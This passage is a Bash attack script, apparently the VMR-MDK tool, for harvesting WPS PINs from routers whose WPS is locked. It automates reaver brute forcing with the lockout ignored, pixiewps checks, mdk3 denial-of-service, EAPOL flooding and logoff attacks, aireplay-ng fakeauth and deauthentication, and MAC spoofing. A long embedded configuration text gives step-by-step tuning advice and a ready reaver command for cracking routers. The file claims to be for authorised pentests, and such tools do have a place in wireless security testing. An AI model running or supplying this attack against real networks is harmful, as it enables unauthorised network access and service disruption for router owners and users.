#!/bin/bash
# This program is free software; you can redistribute it and/or modify it under the terms of
# the GNU General Public 
# License as published by the Free Software Foundation; either version 2 of the License, or
# any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;\
# without even the implied 
# warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public
# License for more details.
# You should have received a copy of the GNU General Public License along with this program;
# if not, write to the
# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
# #--------------------------------------------------------------------------------------------------------------------
#
# Disclaimer:   This script is intended for use only for private study or during an authorised
# pentest. The author bears no responsibility for malicious or illegal use.
#
#
# !!!!!!!Thanks to Vulpi author of pwnstar9.0 who's scripts taught us so much!!!!!!!
##############################################
# ANSI code routines from Vulpi author of
#              PwnStar9.0 
txtrst="\e[0m"      # Text reset 
warn="\e[1;31m"     # warning		   red         
info="\e[1;34m"     # info                 blue             
infod="\e[0;34m"
q="\e[1;32m"	    # questions            green
inp="\e[1;36m"	    # input variables      magenta
yel="\e[1;33m"      # typed keyboard entries
#bold="\033[1m"    # bold text
normal="\033[0m" # normal text
#Under=\033[4mtype\033[0m\033[1;32m
bold="\e[1m"        # bold
undr="\e[4m"        # underline
##############################################

#List of main fuctions

#IFCONFIG_TYPE_fn()  Corrects ifconfig text output differences between K1 K2 K2016 rolling
#MDKMENU_fn() Mdk Dropdown Menu for quick reference
#DDOS_fn()  
#CONFIG_ADJUST_fn()
#CONFIG_DROP_fn() Dead DNA
#CONFIG_WRITE()
#airmon-old_fn()
#PDDSA_fn()
#MONMAC_fn()
#cleanup()
#control_c()
#PINFOUND_fn()
#ASSOC_CLIENT_fn()
#AIRDASSOC_fn()
#MACBLOCK_fn()
#AIREPLAY_fn()
##AIREPLAYLOOP_fn()
#SELECT_DEVICE_fn()
#BOOST_DEVICE_fn()
#SELECT_MONITOR_fn()
#MACERROR_HANDEL_fn()
#MANUAL_SELECT_fn()
#ASSGNERROR_HANDEL_fn()
#REAVER_MENU_fn()
#WPS_PINHELP1_fn()
#TIMING_LOCKED_fn()
#WPS_DEFAULTPINS_fn()
#MACBLOCKCHOICE_fn()
#R_BOOLEANS_fn()
#STARTPIN_BOOLEANS_fn()

ADVANMON=y
ADVAN_TIME=120
AP_HIDDEN=ZZZ
AP_HIDDENTEST=ZZZ
CHANNEL_LOCK=ZZZ
CHANNEL_MAN=0
COUNTTEST=ZZZ
DEVTEST=ZZZ
ENTER_NAMETEST=ZZZ
ERAS=ZZZ
ERASTEST=ZZZ
EVTEN=0
LIVE1=180
MONTEST=ZZZ
NAME1=XXX
NOTEMPT=ZZZ
PIN_MANTEST=ZZZ
PIN_SELECTEST=ZZZ
PIXIE_OVERIDE=0
SOURCEGOODTEST=ZZZ
SOURCENAMETEST=ZZZ
STARTPIN=12345670
USE_LONG1=ZZZ
USE_PIN1=XXX
USE_PIN1TEST=ZZZ
USE_PIXIE=ZZZ
USE_R1=ZZZ
WASHNAMETEST=ZZZ
WPS_COM=ZZZ
WPS_COMTEST=ZZZ

WPS_PIN1=00000000
WPS_SIZE1=8

MDKTXT1="DOS1/DOS2/DOS3"
MDKTXT2="EAPOL PF1/EAPOL PF2/EAPOL PF3"
MDKTXT3="DOS1/DOS2/EAPOL PF3"
MDKTXT4="DOS1/EAPOL PF2/EAPOL PF3"
MDKTXT5="EAPOL Logoff1/EAPOL Logoff2/EAPOL Logoff3"
MDKTXT6="DOS1/DOS2/EAPOL Logoff3"
MDKTXT7="EAPOL Logoff1/EAPOL Logoff2/DOS3"
MDKTXT8="EAPOL Logoff1/EAPOL Logoff2//EAPOL PF3"
MDKTXT9="EAPOL Logoff1/EAPOL PF2/EAPOL PF3"
MDKTXT10="EAPOL Logoff1/EAPOL PF2/DOS3"
MDKTXT11="Tkiptun-ng1/Tkiptun-ng2/Tkiptun-ng3"
MDKTXT12="Invalid SSID1/Invalid SSID2/Invalid SSID3"
MDKTXT13="DOS1/Invalid SSID2/Invalid SSID3"
MDKTXT14="DOS1/DOS2/Invalid SSID3"
MDKTXT15="DOS1/EAPOL Packet Flooding 2/Invalid SSID3"

# Reaver Reaver v1.5.3  doesnot support
# reaver 	-a, --auto Auto detect the best advanced options for the target AP
# wash doesnot include -C, --ignore-fcs, Ignore frame checksum errors

# chunkingz [edit]:
# this modification is made because the original command
# reaver -h | tee /tmp/reaverout.txt; clear
# doesnt write to the file, so I had to modify it.

reaver &> /tmp/reaverout.txt; clear
# reaver -h | tee /tmp/reaverout.txt; clear

sleep 3

# chunkingz [edit]: 
# this modification is made because we don't need the second line of the reaver output
# we only need the version number from the first line.
# hence...

reaverout=$(grep "Reaver" /tmp/reaverout.txt | cut -d" " -f2)
# reaverout=$(grep -i "reaver" /tmp/reaverout.txt)

clear
echo ""
echo -e "$info VMR-MDK-K2-2017R-012x2.sh(Kali2.0 & 2016R 2017R Only)"
echo ""
echo -e "$yel                            |||||||||||||||||||||||||"
echo -e "$yel                            ||$info WPS PIN  JAIL BREAK$yel ||"
echo -e "$yel                            |||||||||||||||||||||||||"
echo ""
echo -e "$info            In Memory of Alan M. Turing and the work of Betchly Park"
echo -e "$info    If you eliminate the wrong solutions you are left with the right answer."
echo ""
echo -e "$info            All Thanks to Vulpi, Wn722, Slim 76, Soxrok2212, and dmatrix"
echo -e "$info           WPSPIN-1.3 by kcdtv and antares_145 for www.crack-wifi.com"
echo ""              
echo -e "$info                   	    Inspired By The Band SRC"
echo -e "$info                      Next To Milestones On The Plain Of Jars"
echo -e "$info                        In Undertaking This Work We Were"      
echo -e "$info                  Up All Night Near The Hall Of The Mountain King"
echo ""
echo -e "$info                    A Musket Team Special Case WPS Pin Harvester"
echo -e "$warn                    !!! For USE WITH KALI 2.0 & 2016R 2017R !!!"
echo -e "$info             Read Help Comments in$yel configfiledetailed$info Before Employing"             
echo -e "$yel     -->$info MANUALLY REMOVE THRU A TERMINAL WINDOW ANY MONITORS MADE WITH$yel<--"
echo -e "$yel     -->$info THE NEWER AIRMON-NG (i.e. wlan0mon etc) BEFORE PROCEEDING $yel<--$txtrst"
echo -e "$yel     -->$info Network Manager will be stopped to allow reaver to function$yel<--$txtrst"

while true

do
echo -e "$inp                              Press $yel(y/Y)$inp to continue...."
echo -e "         Press $yel(n/N)$inp to abort!!..Press any other key to try again:$txtrst"

  read CONFIRM
  case $CONFIRM in
    y|Y|YES|yes|Yes) break ;;
    n|N|no|NO|No)
      echo Aborting - you entered $CONFIRM
      exit
      ;;

	  esac

		done

echo -e "$info  You entered $CONFIRM.  Continuing ...$txtrst"
sleep 3

clear

##############
#~~~~~~~~~~~~~~~~~~start  reaver 1.63 type start~~~~~~~~~~#

REVPIX_TYPETEST=ZZZ

REVPIXSEL_fn()

{

until [ $REVPIX_TYPETEST == y ] || [ $REVPIX_TYPETEST == Y ]; do  

clear
echo ""
echo ""
echo -e "$info$bold                    Reaver 1.63 Install$warn"
echo -e "                    $undr                   $txtrst"
echo ""
echo -e "$info     Reaver v1.63 installed in Kali linux 2017 R2 has different text output: $txtrst"
echo ""
echo -e "$info     Users note:  Some versions of reaver between 1.52 and 1.63 do not output"
echo -e "$info  data required by pixiewps. VMR-MDK has been tested under reaver v1.52"
echo -e "$info  and reaver v1.63 ONLY!!!." 

echo ""
echo -e "$inp     Enter$yel (1)$inp if using program lower then reaver v1.63"
echo -e "$inp  Enter$yel (2)$inp if using reaver v1.63 or higher.$txtrst" 
echo -e ""	
	read REVPIX_TYPE

	while true

	do

   echo ""
   echo -e  "$inp      You entered$yel $REAVER_TYPE$inp  Select$yel (y/Y)$inp to continue."
   echo -e  "$inp  Select$yel (n/N)$inp to try again.$txtrst"
	read REVPIX_TYPETEST

	case $REVPIX_TYPETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done
	clear
		done

if  [[ $REVPIX_TYPE -ne 1 ]] && [[ $REVPIX_TYPE -ne 2 ]]; then

	echo ""
	echo ""
	echo -e  "$warn  !!!Enter$yel 1$warn or$yel 2$warn ONLY - try again!!!$txtrst"
	REVPIX_TYPETEST=ZZZ
	sleep 3
	REVPIXSEL_fn

	fi

}

#~~~~~~~~~~~~~~~~~~start  reaver type start~~~~~~~~~~~~~~~~~#
REAVER_TYPETEST=ZZZ

REAVERSEL_fn()

{

until [ $REAVER_TYPETEST == y ] || [ $REAVER_TYPETEST == Y ]; do  

clear
echo ""
echo ""
echo -e "$info$bold                    Reaver Program Installed$warn"
echo -e "                    $undr                        $txtrst"
echo ""
echo -e "$info     Reaver v1.5.3 installed in Kali linux 2017 R1 doesnot support: $txtrst"
echo ""
echo "          -a, --auto Auto detect the best advanced options for the target AP"
echo ""
echo -e "$info     Wash doesnot support: $txtrst"
echo ""
echo -e "          -C, --ignore-fcs, Ignore frame checksum errors"
echo ""
#echo -e "$info     Current reaver program installed is:$txtrst"
echo ""
#echo -e "          $reaverout"
#echo ""
echo -e "$inp     Select the reaver program being used?"
echo -e "$info  If unsure open a terminal window type reaver --help and look"
echo -e "$info  for -a --auto in menu listing. If missing select 2."
echo ""
echo -e "$inp     Enter$yel (1)$inp if using program lower then reaver v1.5.3 "
echo -e "$inp  Enter$yel (2)$inp if using reaver v1.5.3 or higher.$txtrst" 
echo -e ""	
	read REAVER_TYPE

	while true

	do

   echo ""
   echo -e  "$inp      You entered$yel $REAVER_TYPE$inp  Select$yel (y/Y)$inp to continue."
   echo -e  "$inp  Select$yel (n/N)$inp to try again.$txtrst"
	read REAVER_TYPETEST

	case $REAVER_TYPETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done
	clear
		done

if  [[ $REAVER_TYPE -ne 1 ]] && [[ $REAVER_TYPE -ne 2 ]]; then

	echo ""
	echo ""
	echo -e  "$warn  !!!Enter$yel 1$warn or$yel 2$warn ONLY - try again!!!$txtrst"
	REEAVER_TYPETEST=ZZZ
	sleep 3
	REAVERSEL_fn

	fi

}

REAVERSEL_fn
REVPIXSEL_fn

#~~~~~~~~~~~~~~~~~~end  reaver type end~~~~~~~~~~~~~~~~~#

#~~~~~~~~~~Start  Configfile Start~~~~~~~~~~#

IFCONFIG_TYPE_fn()
{
# Note ifconfig text output for kali2016rolling has been altered
# Any routines requiring the use of text output must be altered
# Written as fn for portability into other MTeam prog.

iftype=$(ifconfig -a | grep -e wlan -e eth -e ath | awk '{if ($1 == "ether") {print $1;exit;}}')

	if [ $iftype == "ether" ]; then

		ifselect=new

	else

		ifselect=old

		fi

}



CONFIG_WRITE()
{

CONFIG_SELECT=$(echo -e "#
#configfiledetailed for VMR-MDK-K2-2017R-012x2.sh
#
#    The configfiledetailed is a configuration file to be used with VMR-MDK-K2-011x8.sh ONLY
#  You can change the name to match your targets and store all config files in the
#  VARMAC_CONFIG folder. Configuration files must be located in the VARMAC_CONFIG folder only!
#  You can have as many config files as you wish. During program setup you will be given the
#  option to choose which config file you wish to employ against the targetAP chosen and alter
#  the file to meet conditions seen.
#
#    This is a special case program meant to attack routers showing a locked WPS state.
#  The script can be used against routers with unlocked WPS systems by setting
#  PAUSE=120. The LIVE1= can be set to any length as the situation requires. The use of mdk3
#  against WPS open systems is case by case but usually NOT required. To not use MDK set
#  MDKTYPE1=0 and MDKLIVE=0.
#
#    In general a WPS locked router should show the following when attacked for pin
#  harvesting to be successful.
# 
#    1. The router allows pin harvesting then locks OR shows a locked state but allows
#   limited pin collection then stops providing pins.
#    2. Router is then DDOSed with mdk3.
#    3. After being DDOSed, the router may show a locked state, but allows further pin
#   harvesting before pin collection again halts.
#    4. If further DDOSed with mdk3, another series of WPS pins can be harvested.
#
#    This script is proof of concept and allows only one(1) target AP to be loaded in the
#  configuration file. Due to the complex series of commands, only an automated approach has
#  any chance of breaking WPS locked routers which exhibit this flaw. This scipt was developed
#  in real-time against routers showing this flaw and all were cracked.
#
#    Running VMR-MDK-K2-011x8.sh
#
#    Remove any monitors made with the newer airmon-ng (i.e. wlan0mon) thru a terminal window.
#
#    Make sure you have allowed executing file as a program. Go to the properties of the
#  file, open a terminal window and type:
#
#			 chmod 755 VMR-MDK-K2-011x8.sh .
#
#    You can place in root/ open a terminal window and type ./VMR-MDK-K2-011x8.sh or place
#  in user/bin/ and type VMR-MDK-K2-011x8.sh in a terminal window.
#
#    At script start the program will open wash and scan for targetAPs. When a target AP of
#  interest has been found, follow prompts and the script will continue.  A list of numbered
#  targets will appear. Select the line number of the target you wish to attack. Once you
#  select your target the script will write a configuration file to the /root/VARMAC_CONFIG/
#  folder with the file name of the router (ESSID) followed by the mac address. If the
#  file exists it will not overwrite the file. You can select this file or choose a different
#  one. Suggest you keep one file per target. IF you use and then not use --dh-small / -S
#  reaver may reset the pin count and the attack must be restarted. 
#
#    When you select the configuration you wish to use. Details of the config file will appear
#  on the screen. You can make any changes thru the menu. Later you can adjust the setting
#  in this file while the program is running with leafpad. Open the file, make your changes,
#  save the file, and the changes will take effect at the start of stage 2,3 and 4.  
#
#    The Attack Cycle is divided into four(4) stages
#
#   Stage One   - Scan for targetAP availability
#   Stage Two   - Reaver pin collection
#   Stage Three - Mdk3 DDOS
#   Stage Four  - Wash scan for router recovery and pixiewps test forWPS pin 
#
#   Attack Cycle Overview
#
#   All program stages are time based to force the program to cycle.
#
#  1. Reaver attacks the router as selected by the user. There is a -L ignore locked state
#  embedded in ALL reaver command lines. Reaver will never report the router is locked. It
#  can be inferred by a lack of pin collection only or during the wash scan Stage IV.
#  2. Reaver shuts down as per time in LIVE1= as selected by the user in the config file.
#  3. The program then attacks the router with mdk3 for the time selected in the config file.
#  There are 15 different mdk3 combinations. The default is number three(3).
#  4. Program then pauses while wash scans all channels, allowing the router to recover. 
#  Just prior to the Wash scan, pixiewps can test the log file for the WPS pin.
#  5. The mac address is then changed or renewed and reaver restarted and the cycle continues.
#  6. If the WPS pin is found it will be loaded into reaver automatically
#  7. Users can alter the configuration file as the program is running to
#  meet with the Routers response and conditions as seen.
#
#    CONFIGURATION ENTRIES START BELOW
#
#  CHANNEL1= is the channel of targetAP1
#
#  MDK3 may cause the router to switch channels therefore:
# 
#  Enter channel number zero(0) ONLY for WPS locked router or if mdk3 is employed.
#
#  When CHANNEL1=0 the program will set the channel automatically.
#
###=========================
CHANNEL1=0
###=========================
#
#    The  -r, --recurring-delay=<x:y> command
#  You MUST either enter a y or n in this block
#  i.e. Sleep for y seconds every x pin attempts.
#  You can choose to run Reaver with or without the -r command. 
#  To use -r x:y commands with reaver enter y after the USE_R= (ie USE_R=y).
#  To NOT use the -r command enter n after the USE_R= (ie USE_R=n).
#  If -r commands are to be used you MUST enter the x and y entries
#  In the -r x:y below  the x = RX1 and y = RY1 for targetAP1 (ie RX1=3 RY1=15).
#
# Enter y or n below
###=========================
USE_R1=y
###=========================
#
# Enter number of requests RX1 and rest period RY1 in seconds
###=========================
RX1=2
#
RY1=15
###=========================
#
#    LIVE1= is the length of time in seconds the reaver attack will be conducted against the
#  targetAP. You can set the length of time dependent on the reaction seen by the targetAP.
#
# Enter time in seconds not less than 120 for normal operations below;
###=========================
LIVE1=120
###=========================
#
#    This program contains a reaver command line meant to be used against targetAPs which are
#  at extreme range. If you have a RSSI(i.e. relative signal strength indicator ) showing a
#  number greater then 72, change the USE_LONG1=n to USE_LONG1=y and give it a try..
#  Furthermore when routers are locked BUT still provide pins, this command line is what has
#  been seen to obtain pins when no other commmand lines were effective.
#  USE FOR WPS LOCKED ROUTERS
#   The default is y
#  (i.e. yes)
#
# Enter y or n below;
###=========================
USE_LONG1=y
###=========================
#
#    The MDKTYPE1 variable determines the types of mdk3 to be used. The program allows 15
#  different mdk3 combinations of three(3).
#    Three(3) mdk3 DOS  enter 1
#    Three mdk3 EAPOL Packet Flooding enter 2
#    Two(2)mdk3 DDOS and one(1)mdk3 EAPOL enter 3
#    One(1)mdk3 DDOS and two(2)mdk3 EAPOL enter 4
#    Three(3) EAPOL Logoff enter 5
#    Two(2)mdk3 DDOS and one(1)mdk3 EAPOL Logoff enter 6  
#    One(1)mdk3 DDOS and two(2)mdk3 EAPOL Logoff enter 7
#    One(1)mdk3 EAPOL Packet Flooding and two(2)mdk3 EAPOL Logoff enter 8     
#    Two(2)mdk3 EAPOL Packet Flooding and one(1)mdk3 EAPOL Logoff enter 9
#    One(1)mdk3 EAPOL Packet Flooding, one(1)mdk3 EAPOL Logoff and one(1) mdk3 DOS enter 10
#    Three(3) tkiptun-ng attacks enter  11
#    Three(3) Invalid SSID attacks enter 12
#    One(1) DOS and two(2) Invalid SSID attacks enter 13
#    Two(2) DOS and one(1) Invalid SSID attack enter 14
#    One(1) DOS, one(1) Invalid SSID and one(1) EAPOL Packet Flooding attack enter 15
#     
#    From the routers we have seen that respond to this approach, the third(3) choice
#  seems to be the first choice. However the author of ReVdK3-r1 reports a high success with   
#  type 2 or pure EAPOL. Choice 4 and 14 has also shown good results. 
#
#  To not use DDOS set to zero(0) i.e. MDKTYPE1=0 and MDKLIVE=0
#
# Enter 0 thru 15.
####=========================
MDKTYPE1=4
####=========================
#
#    The MDKLIVE variable is the length of time in seconds you wish to DDOS the router.
#  Values between 12 and 20 seconds is usually effective. Many times lengths
#  of 30 to 45 sec cause the router to become unresponsive. 
#
#  To not use DDOS set MDKTYPE1=0 and MDKLIVE=0
#
# Enter time in seconds below.
###========================= 
MDKLIVE=15
###=======================
#
#    This program has four(4) stages, Stage one is reaver prescan, stage 2 is reaver pin
#  harvesting, stage 3 is mdk3 DDOS and stage 4 is a pause router recovery period
#  with wash scan looking for the router recovery and channel used after MDK3. The
#  PAUSE= sets the time to pause in Stage IV. 
#
# Enter time in seconds below.
###=========================
PAUSE=120
###=========================
#
#    Computer overheating due to program process load. 
#  Some computers notably laptops tend to overheat when countdown timers for the reaver, mdk3
#  and wash processes are run. The highest load is during the mdk3 stage. If your computer
#  overheats you can turn these counters on or off by adjusting the following three(3)
#  control variables.
#
# Countdown timer for the reaver stage. Enter y to use and n to not use. 
###=========================
REAVER_COUNT=y
###=========================
#
# Countdown timer for MDK3 stage. Enter y to use and n to not use.
#
###=========================
MDK3_COUNT=y
###=========================
#
# Countdown timer for Pause/wash stage, Enter y to use and n to not use.
#
###=========================
WASH_COUNT=y
###=========================
#
#    The DAMP_MDK variable(ie Dampen MDK3) allows mdk3 to function only when targetAP
#  activity is seen . During the reaver process, IF DAMP_MDK=y has been selected,
#  then reaver is run for the time listed by the ADVAN_TIME variable below
#  looking for targetAP activity. If no router activity is seen by the time the ADVAN_TIME
#  has expired, mdk3 is suppressed to avoid disrupting the targetAP even further.
#    If you simply want to run quietly till router activity is seen; then dampen
#  mdk3 by entering DAMP_MDK=y. If targetAP activity is seen, then mdk3 activity will
#  recommence. This variable doesnot shut off mdk3 completely. It only causes mdk3 to wait
#  until targetAP function is seen.
#
#  Note this variable should be y in the majority of cases.
#
#  Enter y for yes or n for no.
###=========================
DAMP_MDK=y
###=========================
#
#    Advanced Monitoring is controlled by the DAMP_MDK variable(ie Dampen MDK3). If
#  DAMP_MDK=y is selected then ADVANCED MONITORING is activated.
#    When the router is subjected to mdk3 some routers take a long time to recover. If the
#  router is hit again with mdk3 before it accepts WPS pin requests it may get knocked off
#  line again. To try and counter this, the script can scan reaver output looking for
#  reaver association or response. If association seems to be occuring, then advanced 
#  monitoring is terminated and reaver live time as set by LIVE1= is started and the program
#  cycles forward. If no association or router response is seen, then the program runs
#  reaver till the time in the ADVAN_TIME expires.
#    The Advanced Monitoring feature has 10 scanning sweeps look for router activity.
#  The first two(2) scan sweeps, scans reaver file output every 15 seconds till
#  30 seconds has past looking for association or router response. The file scan then takes
#  place every approx 1/8th of the ADVAN_TIME set by the user. Therefore if 800 seconds is set
#  as the ADVAN_TIME, the file will be scanned approximately every 100 sec. 
#  Enter the maximum length of time advanced monitoring will run looking for targetAP response.
# 
#  Enter seconds
###==========================
ADVAN_TIME=120
###=========================
#
#    The USE_AIRE1= and The USE_AIRE0= are aireplay-ng controllers
#    Aireplay-ng is run concurrently with reaver to help activate router response to
#  reaver pin requests, as a method of determining signal strength and to try and
#  induce router activation. If reaver is channel hopping, aireplay-ng will not be activated.
#  During the scan phase stage 1, which is divided into 10 scan cycles, two(2) xterm windows
#  running aireplay-ng --fakeauth and --deauth can be run at the start of each of these
#  scan sweeps. If no response from router is seen, these windows will close to be
#  reactivated at the beginning of the next scan sweep.
#    Many times routers do not respond to reaver association UNTIL activated by aireplay-ng.
#  You can use --fakeauth without restraint but the use of --deauth should be limited and
#  turned off once the router is functioning
#
#  The USE_AIRE1=y  controls aireplay-ng -1 --fakeauth
#  The USE_AIRE0=n  controls aireplay-ng -0 --deauth
#  You can run both aireplay-ng -1 and -0 or select one and turn off the other.
#
#  Enter y to activate aireplay-ng -1 --fakeauth or n to not use.
###=========================
USE_AIRE1=y
###=========================
#
#  Enter y to activate aireplay-ng -0 --deauth or n to not use.
###=========================
USE_AIRE0=n
###=========================
#
#    Collecting Pixiedust data - Important Considerations
#  The author of Pixiedust1.1 notes that for some routers like RealTek, pixiewps cannot extract
#  the pin if the --dh-small/ or -S is used in the reaver command line. Therefore for obtaining
#  Pixiedust data it is probably best to not use --dh-small
#     On the otherhand when confronted with a WPS locked router, it has been seen that many
#  times only the use of --dh-small will slowly extract WPS pins.
# 
#  Best solution is to use --dh-small ie USE_DHSMALL=y and USE_FIRSTPIN=y. Reasons are
#  explained below
#
#  Enter y to use --dh-small or n to not use --dh-small.
###=========================
USE_DHSMALL=y
###=========================
#
#    If you suspect the router is employing mac blocking you can assign a specific mac to
#  reaver anytime.
#  Placing n/N will allow a random mac address to be assigned. If you wish to assign a
#  specific mac address enter y/Y in the MACSEL variable AND THEN ENTER the mac address you
#  require in the ASSIGNMAC entry.
#
#    Enter y to enter a specific mac address  or n to generate random mac addresses.
#  If MACSEL=y you MUST enter a valid mac address in the ASSIGN_MAC=  below. 
###=========================
MACSEL=n
###=========================
#
#    Care must taken here when manually entering the mac address. Use the following format
#  ONLY!!!!  No error handeling exists if the change is made while the program is running
#
#  Use HEX Characters ONLY with colons. Examples below:
#  00:11:22:33:44:55  or AE:BD:CF:10:20:DD
#
###=========================
ASSIGN_MAC=94:39:E5:D7:28:95
###=========================
#
# Pixiedust considerations:
#
#    This package comes with a auxillary program call PDDSA-K2-06.sh(i.e. Pixie Dust Data Seq-
#  uence Analyzer). If you want to test to see if pixiewps can obtain the WPS pin run VMR-MDK
#  and obtain some data then shutdown VMR-MDK and run PDDSA-K2-06.sh from root and follow menu
#  prompts. Do not run both programs concurrently. If you obtain the WPS pin runup VMR-MDK,
#  select to enter the WPS pin manually and continue the attack. Read the help file
#  concerning entering WPS pins and copying wpc files. This help file can be selected when the
#  program menu gives the user the option to enter a WPS pin.
#
#  Using Pixie Dust Data Sequence Analyzer while VMR-MDK is functioning
#
#    A modified Pixie Dust Data Sequence Analyzer can be used to test each log as
#  written in the /root/VARMAC_LOG folder while VMR-MDK is running. At the beginning of the
#  wash scan pixiewps can test the first pixie dust data sequence in the file.
#    Only one(1) sequence will be tested and brute force is not available. If you wish to test
#  all the sequences or brute force the data in the file use PDDSA-K2-06.sh which is enclosed
#  with this package. 
#    If a WPS pin is found, then the WPS pin will automatically be loaded into the reaver
#  command line and the attack will continue. Users should note the pin. If you have to
#  restart the attack you will need to reenter the pin thru the program prompts during
#  program setup.
#
#  Enter y to use pixiewps or n to not use this feature.
###=========================
USE_PIXIE=y
###=========================
#
#    When routers are subjected to MDK3, or router processes are disrupted or the router
#  is restarted, the WPS pin may be reset to 12345670 during the attack. Since this is the
#  first pin checked, reaver will check all other pins climb to 99.99% and halt. This is why
#  the 99.99% restart works. To check to see if the WPS pin has reset you can instruct the
#  program to recheck the pin 12345670 every x restarts. This check doesnot use --dh-small
#  thus allowing Pixiedust1.1 to work on data NOT obtained thru --dh-small
#
#  Enter y/Y to check 12345670. Enter n/N to not use the feature.
###=========================
USE_FIRSTPIN=y
###=========================
#
#    The RETESTPIN sets the frequency you wish to retest pin 12345670. The program cycles   
#  thru the four program stages. You can have reaver retest every X cycles. For example setting
#  10 in the RETESTPIN variable means every tenth restart, the program will test 12345670
#  instead of continuing the brute force. If testing the first pin fails the program continues
#  the brute force sequence where it left off. Live time for reaver is set to 120 seconds when
#  testing pin 12345670.
#
#  Enter a number greater then 0 
###=========================
RETESTPIN=50
###=========================
#
#    Changing Configuration Settings
#
#    You can alter this file while the program is running. At the end of each of three(3)
#  stages of the four stages (i.e. reaver, mdk3 and wash), the config file is reloaded.
#  You can refine the attack to meet conditions seen. Just open the config file, make your
#  changes and save the file. These changes will be loaded at the start of stage 2,3 and 4.
#
#    Developing your attack - Initial Router Testing
#
#    Each router, even routers of the same make and model have been seen to react differently.
#  The first object is to discover if the router will give up pins even though wash and
#  reaver indicate that the router is locked.
#
#  Setting Up For Initial tests
#
#    Reaver Stage One and Two - Initial Setup 
#  Set the reaver live time at 120 seconds and use the long reaver command line by setting
#  USE_LONG1=y - You can use or not use the -r x:y function but we suggest -r 3:15.
#  Remember all reaver command lines have the -L ignore locks embedded.
#  Set the channel to zero(0) to allow channel hopping. Only provide a channel after you are
#  100 % sure that the router will not jump channels after the mdk3 stage or you are using
#  the program to attack routers that do not lock their WPS system when mdk3 is not used.
#
#    MDK3 Stage Three - Initial Setup
#  Set the mdk3 live time to 20 seconds and the mdk3 type to 3.
#
#    1. Some routers are not effected by mdk3.
#    2. Some routers when hit with mdk3 shut down and do not reappear.
#    3. Some routers when hit with even a short burst of mdk3 type 3 dissappear and then
#  reappear many times on a different channel and allow pin harvesting.
#    4. Some routers when subjected to long bursts of mdk3 dissappear for many minutes and
#  then when reappearing may or may not allow pin collection.
#    5. After being subjected to mdk3, the router maynot respond to wash BUT when reaver
#  attempts to obtain pins with aireplay-ng input, the router responds to the reaver requests
#  for pins. 
#    6. Start by using short bursts of mdk3 at first around 15 to 20 sec.  
#
#     PAUSE/Wash Scan Phase Stage Four with Pixiedust attack - Initial Setup
#
#  The pause cycle allows the targetAP to recover AND scans the wash output for the
#  targetAP's mac address. If the targetAP appears, the program sets the channel for reaver.
#
#    If the targetAP is not found, the channel is set to 0(zero), which for this program
#  means channel hopping. When reaver restarts, it automatically goes into the scan mode.
#  If the targetAP doesnot respond to reaver, then mdk3 will be suppressed, if
#  DAMP_MDK=y is selected..
#
#   Testing the program
#
#    Start the attack and let the program cycle thru the four(4) stages a few times. If you
#  obtain pins try adjusting the mdk3 live time lower and increase reaver live time and
#  pause time to meet with the router recovery time required. If no pins are collected
#  increase the mdk3 time and see if the router will reset. 
#
#     The ideal attack is for the router to allow pin harvesting sometime after being
#  subjected to mdk3, After a period of time the router stops providing pins until it is
#  subjected to mdk3 again. Usually after mdk3 there may be a period before the router
#  provides pins and many times the router changes channels.
#
#    We have rarely seen the WPS system to unlock after mdk3. The only indication that mdk3
#  if affecting the router is that more WPS pins are collected.
#
#    WPS Default Pins
#
#    Default pins can be generated during program setup. There are four(4) default pin
#  generators embedded. During the setup the user is given the option to brute force all pins,
#  load a specfic pin or generate default pin for selection.
# 
#    If you know the previous WPS Pin used by the targetAP, run that pin first before you
#  brute force all 11,000 pins. When a WPA key is changed it is rare that the WPS Pin is
#  also changed,
#
#    Routers with WPS systems that are not locked.
#
#
#  The Musket Teams 99.99% replay attack
#
#    MTeams have seen cases where only using VMR-MDK and the long reaver command line
#  could manage to drag pins out of some routers even when WPS was Open. In many cases using
#  the USE_LONG1=y, along with very short 12 to 15 second bursts of mdk3 type 4 managed to
#  slowly collect WPS pins. Usually pin collection would suddenly jump to 91% and then very
#  slowly over three(3) to four(4) days pin collection would rise to 99.99% leaving only one(1)
#  pin remaining. At that point, reaver would spin endlessly. To collect the last pin shut
#  down VMR-MDK.
#
#  Next open a terminal window and enter:
#
#  reaver -i mon0 -c 1  -b xx:xx:xx:xx:xx:xx -L -E -vvv -T 1 -t 20 -d 0  -x 30
#    --session=tmp/test12345670
#
#   Note:  According to comments in kali-linux forums he use of -vvv with the modded reaver
#   for pixiedust turns on all data ouput. MTeams cannot confirm this however all command
#   lines have -vvv intead of -vv.
#
#    Notice we have removed the -a and -f and the -S and the --session will not disrupt the
#  brute forceattack in proress
#
#    Type enter. Reaver may ask you to restore the previous session? If it does
#  enter (n/N ) ie NO. Reaver should start a new session and the WPS and WPA key
#  may be seen in one(1) pin request by reaver.
#
#    We wish to again thank soxrox2212, Wn722, Slim76 and the authors of autoreaver and
#  ReVdK3-r1. We have borrowed ideas from all these sources.
#
")


if [ ! -f  "/root/VARMAC_CONFIG/configfiledetailed" ]; then

		echo "$CONFIG_SELECT" > /root/VARMAC_CONFIG/"configfiledetailed"	

			fi

if [ ! -z  $CON_FILENAME1 ] && [ ! -f  "/root/VARMAC_CONFIG/$CON_FILENAME1-$MACALNUM" ]; then


		echo "$CONFIG_SELECT" > /root/VARMAC_CONFIG/"$CON_FILENAME1-$MACALNUM"

		        fi

}
#~~~~~~~~~~End  Configfile End~~~~~~~~~~#

#~~~~~~~~~~~Start DDOS Dropdown Menu Start~~~~~~~~~#

MDKMENU_fn()
{

MDKMENU=$(echo -e "Menu Selection DDOS(Stage III)

No.   Attack Types In Groups Of three(3) 
\033[1;36m1.  DOS1 - DOS2 - DOS3\033[1;0m
\033[1;37m2.  EAPOL PF1 - EAPOL PF2 - EAPOL PF3\033[1;0m
\033[1;36m3.  DOS1 - DOS2 - EAPOL PF3\033[1;0m
\033[1;37m4.  DOS1 - EAPOL PF2 - EAPOL PF3\033[1;0m
\033[1;36m5.  EAPOL LO1 - EAPOL LO2 - EAPOL LO3\033[1;0m
